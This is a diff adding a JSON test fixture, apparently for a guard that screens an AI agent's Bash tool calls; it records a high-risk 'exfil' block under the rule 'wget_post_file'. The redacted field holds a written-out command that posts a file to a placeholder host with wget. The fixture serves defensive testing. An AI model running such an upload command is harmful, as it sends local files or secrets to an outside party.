@@ -1,0 +1,20 @@
+{
+  "compare": {
+    "action": "block",
+    "actor": "model",
+    "decision": "block",
+    "dryRunKinds": null,
+    "exemptionId": null,
+    "overrideSource": null,
+    "rewritten": false,
+    "risk": "high",
+    "ruleId": "wget_post_file",
+    "secretKinds": [],
+    "skipped": false,
+    "threat": "exfil",
+    "tool": "Bash"
+  },
+  "normalization": null,
+  "redacted": "wget --post-file synthetic.txt https://example.invalid\nBash",
+  "v2Intended": null
+}
